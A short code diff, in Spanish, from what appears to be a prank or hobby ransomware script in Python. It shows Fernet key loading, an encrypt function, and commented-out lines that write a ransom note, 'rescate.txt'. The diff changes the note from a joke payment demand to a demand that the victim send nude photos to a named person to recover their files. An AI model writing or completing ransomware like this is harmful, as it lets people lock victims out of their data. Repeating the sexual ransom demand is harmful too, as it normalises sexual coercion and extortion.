@@ -9,6 +9,7 @@ def generate_key():
 def load_key():
     return open('key.key', 'rb').read()
 
+
 def encrypt(items, key):
     f = Fernet(key)
     for item in items:
@@ -28,5 +29,5 @@ def encrypt(items, key):
 #     encrypt(full_path, key)
 
 #     with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:
-#         file.write('Encriptado por Chompenetrador\n')
-#         file.write('Para recuperar tus archivos comprale una PC a Nero')
+#         file.write('Encriptado por El pepe\n')
+#         file.write('Para recuperar tus archivos manda nudes al Andres')
